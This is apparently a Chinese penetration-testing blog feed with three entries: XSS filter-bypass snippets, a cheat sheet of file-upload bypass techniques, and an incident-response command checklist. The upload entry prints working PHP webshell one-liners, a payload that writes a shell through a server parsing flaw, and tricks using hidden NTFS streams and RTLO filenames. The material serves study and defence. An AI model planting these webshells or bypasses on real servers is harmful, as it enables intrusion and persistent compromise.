<h1 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">. 可以用 with</div><div class="line">onerror 可以用 onblur oncut</div><div class="line">window 可以用 top parent self</div><div class="line">al%00ert</div><div class="line">``</div><div class="line">\x0A\x0D 可以用 \x2028\x2029</div><div class="line">base64解码函数atob()</div><div class="line">&quot;oncut=_=window;_.onerror=_[&quot;al&quot;+&quot;ert&quot;];throw[1]</div><div class="line">&quot;oncut=location=&quot;javascript:aler&quot;+&quot;t%&quot;+&quot;281%&quot;+&quot;29</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> XSS </tag>
            
            <tag> WAF绕过 </tag>
            
            <tag> PHP </tag>
            
            <tag> webshell </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[文件上传(绕过)]]></title>
      <url>/2017/02/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E7%BB%95%E8%BF%87/</url>
      <content type="html"><![CDATA[<p>根据个人经验,搜集总结，欢迎大牛们补充、纠错  -_-<br><a id="more"></a></p>
<h1 id="文件上传校验姿势"><a href="#文件上传校验姿势" class="headerlink" title="文件上传校验姿势"></a>文件上传校验姿势</h1><ul>
<li>客户端javascript校验（一般只校验后缀名）</li>
<li>服务端校验</li>
<li>文件头<code>content-type</code>字段校验（image/gif）</li>
<li>文件内容头校验（GIF89a）</li>
<li>后缀名黑名单校验</li>
<li>后缀名白名单校验</li>
<li>自定义正则校验</li>
<li>WAF设备校验（根据不同的WAF产品而定）</li>
</ul>
<h1 id="文件上传绕过校验姿势"><a href="#文件上传绕过校验姿势" class="headerlink" title="文件上传绕过校验姿势"></a>文件上传绕过校验姿势</h1><ul>
<li>客户端绕过（抓包改包）</li>
<li>服务端绕过</li>
<li>文件类型</li>
<li>文件头</li>
<li>文件后缀名</li>
<li>配合文件包含漏洞绕过</li>
<li>配合服务器解析漏洞绕过</li>
<li>CMS、编辑器漏洞绕过</li>
<li>配合操作系统文件命名规则绕过</li>
<li>配合其他规则绕过</li>
<li>WAF绕过</li>
<li>黑名单绕过</li>
<li>白名单绕过</li>
</ul>
<h2 id="1-客户端绕过"><a href="#1-客户端绕过" class="headerlink" title="1.客户端绕过"></a>1.客户端绕过</h2><p>可以利用burp等抓包改包，先上传一个gif类型的木马，然后通过burp将其改为<code>asp/php/jsp</code>后缀名即可。</p>
<h2 id="2-服务端绕过"><a href="#2-服务端绕过" class="headerlink" title="2.服务端绕过"></a>2.服务端绕过</h2><h3 id="2-1-文件类型绕过"><a href="#2-1-文件类型绕过" class="headerlink" title="2.1 文件类型绕过"></a>2.1 文件类型绕过</h3><p>我们可以通过抓包，将<code>content-type</code>字段改为<code>image/gif</code></p>
<h3 id="2-2-文件头绕过"><a href="#2-2-文件头绕过" class="headerlink" title="2.2 文件头绕过"></a>2.2 文件头绕过</h3><p>在木马文件内容开头加上一些文件头信息</p>
<blockquote>
<p>GIF89a&lt;?php phpinfo(); ?&gt;</p>
</blockquote>
<p>判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">（1）  .JPEG;.JPE;.JPG，”JPGGraphic File”</div><div class="line">（2）  .gif，”GIF 89A”</div><div class="line">（3）  .zip，”Zip Compressed”</div><div class="line">（4）  .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</div></pre></td></tr></table></figure></p>
<h3 id="2-3-文件名-后缀绕过"><a href="#2-3-文件名-后缀绕过" class="headerlink" title="2.3 文件名/后缀绕过"></a>2.3 文件名/后缀绕过</h3><h4 id="2-3-1-截断"><a href="#2-3-1-截断" class="headerlink" title="2.3.1 截断"></a>2.3.1 截断</h4><p><code>test.php%00.jpg</code>,<code>test.php0xoo.jpg</code></p>
<h4 id="2-3-2-windows特性"><a href="#2-3-2-windows特性" class="headerlink" title="2.3.2 windows特性"></a>2.3.2 windows特性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">ADS流：test.php::$DATA(见下)</div><div class="line">test.php.</div><div class="line">test.php_</div><div class="line">test.php(空格)</div><div class="line">*=.</div><div class="line">&lt;=*</div><div class="line">&gt;=?</div><div class="line">test.&lt;&lt;&lt;</div><div class="line">test.php:1.jpg会生成一个test.php的空文件</div></pre></td></tr></table></figure>
<h4 id="2-3-3-ASP"><a href="#2-3-3-ASP" class="headerlink" title="2.3.3 ASP"></a>2.3.3 ASP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">解析漏洞:</div><div class="line">.asp;.jpg</div><div class="line">.asp.jpg</div><div class="line">.asp;jpg</div><div class="line">+111.asp;+222.jpg</div><div class="line">/111.asp/1.jpg</div><div class="line">/111.aspx/1.jpg</div><div class="line">后缀名：</div><div class="line">asa,cer,cdx,ashx,asmx,xml,htr,asax</div><div class="line">双文件扩展：</div><div class="line">test.asp.jpg</div><div class="line">RTLO：</div><div class="line">asp.html-内容为一句话</div><div class="line">php.txt-内容为一句话</div></pre></td></tr></table></figure>
<h4 id="2-3-4-JSP"><a href="#2-3-4-JSP" class="headerlink" title="2.3.4 JSP"></a>2.3.4 JSP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">.jsp.jpg.jsp-用两个jsp包围中间的jpg</div><div class="line">后缀名：jspf,jspa,jsps</div></pre></td></tr></table></figure>
<h4 id="2-3-5-PHP"><a href="#2-3-5-PHP" class="headerlink" title="2.3.5 PHP"></a>2.3.5 PHP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">后缀名：.php3 ,.php5,.php7</div><div class="line">大小写：pHp</div><div class="line">解析漏洞：</div><div class="line">1.php.jpg</div><div class="line">1.jpg.php</div><div class="line">1.php  jpg(jpg前面两个空格)</div><div class="line">1.php jpg(jpg前面一个空格)</div><div class="line">/1.jpg/1.php</div><div class="line">/1.jpg%00.php</div><div class="line">/1.jpg/.php</div><div class="line">/1.jpg/php</div><div class="line">特殊文件利用：</div><div class="line">.htaccess</div><div class="line">.user.ini</div></pre></td></tr></table></figure>
<h3 id="3-配合文件包含漏洞"><a href="#3-配合文件包含漏洞" class="headerlink" title="3.配合文件包含漏洞"></a>3.配合文件包含漏洞</h3><ol>
<li>上传一个符合条件格式的文档，文档内容为一句话木马，eg：test.txt</li>
<li>利用文件包含漏洞包含上传的木马文件,eg:page?id=D:/www/test.txt</li>
</ol>
<h3 id="4-配合服务器解析漏洞"><a href="#4-配合服务器解析漏洞" class="headerlink" title="4.配合服务器解析漏洞"></a>4.配合服务器解析漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">IIS5.x-6.x:</div><div class="line">目录解析(6.0):/1.asp/1.jpg</div><div class="line">文件解析:1.asp;.jpg</div><div class="line">文件类型:1.asa,a.cer,1.cdx</div><div class="line">IIS7.5：</div><div class="line">IIS7.5是由于php配置文件中，开启了cgi.fix_pathinf</div><div class="line">Apache:</div><div class="line">从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断</div><div class="line">后缀不识别：1.php.php123</div><div class="line">配置错误：1.php.jpg</div><div class="line">Nginx：</div><div class="line">Nginx默认是以CGI的方式支持PHP解析的，和IIS7.5一样开启了cgi.fix_pathinf</div><div class="line">1.jpg/1.php</div><div class="line">1.jpg%00.php</div><div class="line">1.jpg/%20\1.php</div><div class="line">上传一个名字为test.jpg，以下内容的文件</div><div class="line">&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[caidao])?&gt;&apos;);?&gt;</div><div class="line">然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php</div></pre></td></tr></table></figure>
<h3 id="5-配合操作系统文件命令规则"><a href="#5-配合操作系统文件命令规则" class="headerlink" title="5.配合操作系统文件命令规则"></a>5.配合操作系统文件命令规则</h3><ol>
<li><p>上传不符合windows文件命名规则的文件名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">test.asp.</div><div class="line">test.asp(空格)</div><div class="line">test.php:1.jpg</div><div class="line">test.php::$DATA</div><div class="line">shell.php::$DATA…….</div><div class="line">会被windows系统自动去掉不符合规则符号后面的内容。</div></pre></td></tr></table></figure>
</li>
<li><p>linux下后缀名大小写<br>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p>
<h3 id="6-CMS、编辑器漏洞"><a href="#6-CMS、编辑器漏洞" class="headerlink" title="6.CMS、编辑器漏洞"></a>6.CMS、编辑器漏洞</h3></li>
</ol>
<ul>
<li>CMS漏洞：针对不同CMS存在的上传漏洞进行绕过。</li>
<li>编辑器漏洞：比如FCK，Ewebeditor等，可以针对编辑器的漏洞进行绕过。</li>
</ul>
<h3 id="7-其他规则"><a href="#7-其他规则" class="headerlink" title="7.其他规则"></a>7.其他规则</h3><h4 id="7-1-利用waf特性"><a href="#7-1-利用waf特性" class="headerlink" title="7.1 利用waf特性"></a>7.1 利用waf特性</h4><ul>
<li>在恶意代码前加垃圾数据；</li>
<li>在数据包前加垃圾数据；</li>
<li>在Content-Disposition参数后面加垃圾数据；</li>
<li>多加一个filename；</li>
<li>更改HTTP请求方法；</li>
<li>删除实体里面的Conten-Type字段；<blockquote>
<p>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。</p>
</blockquote>
</li>
<li>删除Content-Disposition字段里的空格</li>
<li>增加一个空格</li>
<li>修改Content-Disposition字段值的大小写</li>
<li>文件名后缀处回车</li>
<li>多个Content-Disposition<h4 id="7-2-利用NTFS-ADS特性"><a href="#7-2-利用NTFS-ADS特性" class="headerlink" title="7.2 利用NTFS ADS特性"></a>7.2 利用NTFS ADS特性</h4>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">test.php:a.jpg　　　　　　　　　生成test.php  空</div><div class="line">test.php::$INDEX_ALLOCATION  生成test.php文件夹  </div><div class="line">test.php::$DATA\1.jpg  　　　生成1.jpg(不可见的)</div><div class="line">echo ^&lt;?php @eval(request[caidao])?^&gt;  &gt; index.php:hidden.jpg</div><div class="line">这样子就生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个hidden.jpg的。我们可以在另外一个正常文件里把这个ADS文件include进去，&lt;?php include(‘index.php:hidden.jpg’)?&gt;，这样子就可以正常解析我们的一句话了</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="7-3-利用RTLO"><a href="#7-3-利用RTLO" class="headerlink" title="7.3 利用RTLO"></a>7.3 利用RTLO</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">新建一个文件php.html</div><div class="line">内容为：&lt;?php @eval($_POST[&apos;caidao&apos;]);?&gt;</div><div class="line">重命名文件：输入名字的文本框里点右键，选择“插入unicode控制字符”，然后就到了这个菜单栏，我们选择RLO</div><div class="line">这个时候php.html已经变成了html.php了</div></pre></td></tr></table></figure>
<h4 id="7-4-特殊的长文件名绕过"><a href="#7-4-特殊的长文件名绕过" class="headerlink" title="7.4 特殊的长文件名绕过"></a>7.4 特殊的长文件名绕过</h4><p>文件名使用非字母数字，比如中文等最大程度的拉长<br><code>shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</code></p>
<h4 id="7-5-反删除"><a href="#7-5-反删除" class="headerlink" title="7.5 反删除"></a>7.5 反删除</h4><p>将<code>name=&quot;file1&quot;</code>改成了file4，可以防止文件删除（JCMS漏洞）</p>
<h4 id="7-8-图片转换-二次渲染-文件幻数检测"><a href="#7-8-图片转换-二次渲染-文件幻数检测" class="headerlink" title="7.8 图片转换/二次渲染/文件幻数检测"></a>7.8 图片转换/二次渲染/文件幻数检测</h4><ul>
<li>在不破坏文件本身渲染情况下，在空白区进行代码填充，一般是图片注释</li>
<li>溢出攻击</li>
<li>绕过GD库</li>
</ul>
<p>…</p>
]]></content>
      
        
        <tags>
            
            <tag> WAF绕过 </tag>
            
            <tag> PHP </tag>
            
            <tag> 文件上传 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[应急响应资料整理]]></title>
      <url>/2017/02/13/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/</url>
      <content type="html"><![CDATA[<p>趁着最近不是很忙，整理了下最近学习的一些应急响应的一些命令、资料，方便以后查看，有什么问题还望指出，多多交流！ 0.0<br><a id="more"></a></p>
<h1 id="怎么做应急响应？"><a href="#怎么做应急响应？" class="headerlink" title="怎么做应急响应？"></a>怎么做应急响应？</h1><p>具体怎么做应急响应，根据网上应急响应的经验总结几点：</p>
<ol>
<li>确定攻击时间</li>
<li>查找攻击线索</li>
<li>梳理攻击流程</li>
<li>实施解决方案</li>
<li>定位攻击者</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1、确定攻击时间能够帮助我们缩小应急响应的范围，有助于我们提高效率，</div><div class="line">2、查找攻击线索，能够让我们知道攻击者都做了什么事情，</div><div class="line">3、梳理攻击流程则是还原整个攻击场景，</div><div class="line">4、实施解决方案就是修复安全漏洞，切断攻击途径，</div><div class="line">5、最后就是定位攻击人，则是取证。</div></pre></td></tr></table></figure>
<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><p>全是套路，但一般很有用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">1、备份系统日志及默认的httpd服务日志</div><div class="line">linux:</div><div class="line">tar -cxvf secure_logs.tar.gz /var/log/secure</div><div class="line">tar -cxvf messages_logs.tar.gz /var/log/messeges</div><div class="line">tar -cxvf httpd_logs.tar.gz /var/log/httpd/</div><div class="line">windows:</div><div class="line">应用程序日志、系统日志、安全日志；默认情况下，如果系统不对事件做审核则不会生成安全日志。</div><div class="line">开始→设置→控制面板→管理工具→事件查看器</div><div class="line">Windows日志文件默认位置是%systemroot%\system32\config </div><div class="line">安全日志文件：%systemroot%\system32\config \SecEvent.EVT </div><div class="line">系统日志文件：%systemroot%\system32\config \SysEvent.EVT </div><div class="line">应用程序日志文件：%systemroot%\system32\config \AppEvent.EVT </div><div class="line">FTP连接日志和HTTPD事务日志：%systemroot% \system32\LogFiles\ </div><div class="line">IIS日志默认存放在System32\LogFiles目录下，使用W3C扩展格式</div><div class="line">2、备份last可以查看登录信息(登录时间能不能跟运维人员时间对上)</div><div class="line">last &gt; last.log</div><div class="line">3、查询utmp文件并显示当前系统中每个用户和它所运行的进程信息</div><div class="line">w &gt; w.log</div><div class="line">4、系统服务备份</div><div class="line">chkconfig --list &gt; services.log</div><div class="line">5、查看可疑进程 </div><div class="line">linux：</div><div class="line">ps -aux或ps -ef 查看进程文件路径、pid号（一般ps -ef能比较清晰的看出反弹shell）</div><div class="line">ps -aux的结果比较杂乱,pstree -a的结果比较简单明了</div><div class="line">lsof -i :port 检查哪个进程使用这个端口</div><div class="line">lsof -p 1234 检查pid号为1234进程调用情况</div><div class="line">strace -f -p 1234 跟踪分析pid号为1234的进程</div><div class="line">windows：</div><div class="line">tasklist </div><div class="line">taskkill</div><div class="line">6、监听端口备份(查看端口及对应服务对外开放情况)</div><div class="line">linux: netstat -antup &gt; port-listen.log</div><div class="line">windows: netstat -ano &gt; port-listen.log</div><div class="line">7、查看用户信息</div><div class="line">linux： cat /etc/passwd</div><div class="line">windows： net user</div><div class="line">8、查找最近5天内更改的文件</div><div class="line">find /home/work -type f -mtime -5</div><div class="line">9、Rootkit查找</div><div class="line">linux: Rootkit Hunter、chkrootkit</div><div class="line">windows: 勒索软件终结者</div><div class="line">10、查看服务占用资源情况</div><div class="line">top &gt; top.log</div><div class="line">11、查看计划任务(很多后门程序通过crontab完成自启)</div><div class="line">linux： crontab -l</div><div class="line">不过有时候crontab -l并不能解决问题，通常还要做如下操作：</div><div class="line">cd /etc/crontab</div><div class="line">ls</div><div class="line">crontab -r 删除计划任务</div><div class="line">windows： 管理-&gt;任务计划程序-&gt;任务计划程序库</div><div class="line">12、查看有没有提权痕迹</div><div class="line">cat /etc/passwd  极有可能其他用户出现id，组id 0、0的情况</div><div class="line">lsof -g gid号   通常能找到恶意文件关联的lib文件</div><div class="line">13、显示最后登录系统的倒数10条记录</div><div class="line">last -10</div><div class="line">14、查看执行过什么命令</div><div class="line">cat ~/.bash_history</div><div class="line">history | grep &apos;2017-2-12&apos;  根据时间查看干了什么</div><div class="line">history | tail -n 5 显示最近5次执行的命令</div><div class="line">history -c 清空history历史</div><div class="line">15、查找777的权限的文件</div><div class="line">find / *.jsp  -perm 777</div><div class="line">16、网络连接</div><div class="line">查看与该ip链接的进程及文件路径、pid号</div><div class="line">netstat -anp| grep 8.8.8.8 linux</div><div class="line">netstat -ano|find &quot;8.8.8.8&quot; windows</div></pre></td></tr></table></figure></p>
<h1 id="WEB方式入侵"><a href="#WEB方式入侵" class="headerlink" title="WEB方式入侵"></a>WEB方式入侵</h1><p>主要通过web应用程序、strust2、数据库等其他高危漏洞<br>例如apache<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">apache的默认重要配置信息如下：</div><div class="line">配置文件：`/etc/httpd/conf/http.conf`</div><div class="line">服务器的根目录：`/var/www/html`</div><div class="line">访问日志文件：`/var/log/httpd/access_log`</div><div class="line">错误日志文件：`/var/log/httpd/error_log`</div><div class="line">运行apache的用户：apache</div><div class="line">模块存放路径：`/usr/lib/httpd/modules`</div><div class="line">1、查看日志文件</div><div class="line">2、根据日志文件信息定位恶意文件位置</div><div class="line">3、`stat`记录恶意文件信息</div><div class="line">4、找到恶意进程</div><div class="line">比如恶意进程名是fu4k</div><div class="line">5、进入proc/对应pid目录/fd</div><div class="line">ps -aux | grep fu4k</div><div class="line">cd /proc/fu4k/fd</div><div class="line">在/usr/bin目录下，stat信息：</div><div class="line">stat /usr/bin/fu4k</div><div class="line">6、查找系统中包含指定字符的所有文件（可以拿已知shell密码及特定字符作为关键字）</div><div class="line">find /|xargs grep -ri &quot;caidao&quot; -l 2&gt; webshell.log（执行后会改变所有文件的atime）</div></pre></td></tr></table></figure></p>
<h1 id="非web方式入侵"><a href="#非web方式入侵" class="headerlink" title="非web方式入侵"></a>非web方式入侵</h1><p>主要通过bash其他高危服务，大多属于ssh(22)、vnc(5900)对外且弱口令的情况，主要结合syslog<code>/var/log/message.*</code>判断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">1、判断服务器是否支持访问外网，如支持，通过netstat –an查看是否已与外部可疑服务器建立连接，如已建立需及时断开</div><div class="line">2、记录后门文件stat信息，根据mtime查找其他后门文件，同时根据文件属组与属组对应运行服务判断入侵方式</div><div class="line">3、如果权限组为root，需要检测是否被种rootkit</div><div class="line">4、非web类后门，大部分人习惯把恶意文件放置在`/tmp`目录下；</div><div class="line">5、通过可疑进程名与cpu占用率排查，有些后门会伪装正常进程名；</div><div class="line">使用`top`命令查看cpu占用率，找出后门进程</div><div class="line">6、获取进程pid后可cd到`/proc/对应pid/fd</div><div class="line">7、查看是否有相关计划任务，后门程序为保证自启动往往会添加新的计划任务</div></pre></td></tr></table></figure></p>
<h1 id="入侵后需要被关注的文件"><a href="#入侵后需要被关注的文件" class="headerlink" title="入侵后需要被关注的文件"></a>入侵后需要被关注的文件</h1><p>linux:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">/var/log/messages — 包括整体系统信息，其中也包含系统启动期间的日志。此外，mail，cron，daemon，kern和auth等内容也记录在var/log/messages日志中。</div><div class="line">/var/log/dmesg — 包含内核缓冲信息（kernel ring buffer）。在系统启动时，会在屏幕上显示许多与硬件有关的信息。可以用dmesg查看它们。</div><div class="line">/var/log/auth.log — 包含系统授权信息，包括用户登录和使用的权限机制等。</div><div class="line">/var/log/boot.log — 包含系统启动时的日志。</div><div class="line">/var/log/daemon.log — 包含各种系统后台守护进程日志信息。</div><div class="line">/var/log/dpkg.log – 包括安装或dpkg命令清除软件包的日志。</div><div class="line">/var/log/kern.log – 包含内核产生的日志，有助于在定制内核时解决问题。</div><div class="line">/var/log/lastlog — 记录所有用户的最近信息。这不是一个ASCII文件，因此需要用lastlog命令查看内容。</div><div class="line">/var/log/maillog /var/log/mail.log — 包含来着系统运行电子邮件服务器的日志信息。例如，sendmail日志信息就全部送到这个文件中。</div><div class="line">/var/log/user.log — 记录所有等级用户信息的日志。</div><div class="line">/var/log/Xorg.x.log — 来自X的日志信息。</div><div class="line">/var/log/alternatives.log – 更新替代信息都记录在这个文件中。</div><div class="line">/var/log/btmp – 记录所有失败登录信息。使用last命令可以查看btmp文件。例如，”last -f /var/log/btmp | more“。</div><div class="line">/var/log/cups — 涉及所有打印信息的日志。</div><div class="line">/var/log/anaconda.log — 在安装Linux时，所有安装信息都储存在这个文件中。</div><div class="line">/var/log/yum.log — 包含使用yum安装的软件包信息。</div><div class="line">/var/log/cron — 每当cron进程开始一个工作时，就会将相关信息记录在这个文件中。</div><div class="line">/var/log/secure — 包含验证和授权方面信息。例如，sshd会将所有信息记录（其中包括失败登录）在这里。</div><div class="line">/var/log/wtmp或/var/log/utmp — 包含登录信息。使用wtmp可以找出谁正在登陆进入系统，谁使用命令显示这个文件或信息等。</div><div class="line">/var/log/faillog – 包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。</div><div class="line">除了上述Log文件以外， /var/log还基于系统的具体应用包含以下一些子目录：</div><div class="line">/var/log/httpd/或/var/log/apache2 — 包含服务器access_log和error_log信息。</div><div class="line">/var/log/lighttpd/ — 包含light HTTPD的access_log和error_log。</div><div class="line">/var/log/mail/ –  这个子目录包含邮件服务器的额外日志。</div><div class="line">/var/log/prelink/ — 包含.so文件被prelink修改的信息。</div><div class="line">/var/log/audit/ — 包含被 Linux audit daemon储存的信息。</div><div class="line">/var/log/samba/ – 包含由samba存储的信息。</div><div class="line">/var/log/sa/ — 包含每日由sysstat软件包收集的sar文件。</div><div class="line">/var/log/sssd/ – 用于守护进程安全服务。</div><div class="line">~/.bash_history  至关重要的日志，往往黑客会使用history -c清理相关的日志</div></pre></td></tr></table></figure></p>
<p><strong>入侵后web服务器日志分析</strong><br>web服务器的种类很多，接触比较多的为apache、tomcat、nagix为主。无论任何web服务器其实日志需要关注的东西是一致的，即<code>access_log</code>和<code>error_log</code>。<br><strong>查看哪些IP在暴力破解root</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">grep &quot;Failed password for root&quot; /var/log/auth.log | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more</div><div class="line">cat /var/log/messeges|grep root</div><div class="line">cat /var/log/messages |grep &apos;root from&apos; | wc -l 查看爆破次数</div></pre></td></tr></table></figure></p>
<p>一般确定ip地址后，通过:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">find . access_log |grep xargs ip攻击地址</div><div class="line">find . access_log| grep xargs 木马文件名</div><div class="line">tail -F  /var/log/httpd/error_log | grep ip攻击地址  动态查看日志</div></pre></td></tr></table></figure></p>
<p>通过<code>access_log</code>和<code>error_log</code>中的数据我们一般能明确以下几件事情：</p>
<ol>
<li>文件是什么时刻上传的，应急响应中确定攻击发生的攻击点十分重要。通过时间点可以有效的查找加密木马，隐蔽的后门等。</li>
<li>攻击的IP地址是多少，当然一般情况是跳板地址T_T</li>
<li>传了什么文件上来</li>
</ol>
<p><strong>筛选指定IP访问的URL，并按照访问数量排序</strong><br><code>cat access.log |grep &quot;192.168.11.37&quot; | awk &#39;{print $7}&#39; | sort | uniq -c |sort -nr</code><br><strong>筛选出访问状态码是500的所有IP地址，并按照访问次数排序</strong><br><code>cat access.log |grep &quot;HTTP/1.1\&quot; 500&quot; | awk &#39;{print $1}&#39; | sort | uniq -c |sort -nr</code></p>
<p><strong>筛选<code>/var/log/secure</code>日志找到爆破ssh的ip</strong><br><code>cat /var/log/secure |grep &#39;Accepted password&#39;</code><br><strong>查看cron日志</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">/etc/cron.hourly/cron.sh</div><div class="line">/etc/cron.hourly/udev.sh</div><div class="line">查看第一次计划任务时间：</div><div class="line">cat /var/log/cron |grep &apos;恶意文件名&apos;|sort|head</div></pre></td></tr></table></figure></p>
<p>windows:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">x:\RECYCLER\</div><div class="line">C:\Documents and Settings\</div><div class="line">c:\users\</div><div class="line">c:\windows\temp\</div><div class="line">IIS的默认上传目录</div><div class="line">日志分析工具：</div><div class="line">[Web日志安全分析工具 v2.0.exe]()</div></pre></td></tr></table></figure></p>
